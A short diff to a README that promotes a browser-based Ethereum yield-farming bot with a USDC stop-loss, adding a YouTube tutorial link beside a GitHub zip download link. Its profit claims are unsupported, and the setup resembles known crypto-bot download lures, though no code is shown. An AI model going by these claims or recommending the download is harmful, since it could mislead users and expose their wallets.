@@ -5,7 +5,7 @@ This is a simple but highly effective JavaScript local web browser ran high yiel
 After the volatility subsides it sells the stable coin and goes back to yield farming, this algorithm of selling before volatility and buying in when volatility subsides greatly increases profit and holdings of the primary coin. 
 
 I made this video tutorial on how to configure it and run it.
-
+https://youtu.be/XNfaGj2Egaw
 
 You can download the zip file of it here
 https://github.com/SebastianTutorials/ETHEREUM-Yield-farming-bot-with-USDC-Stoploss/raw/main/Max-Yield-farming-bot-with-stoploss-volatility-protection.zip
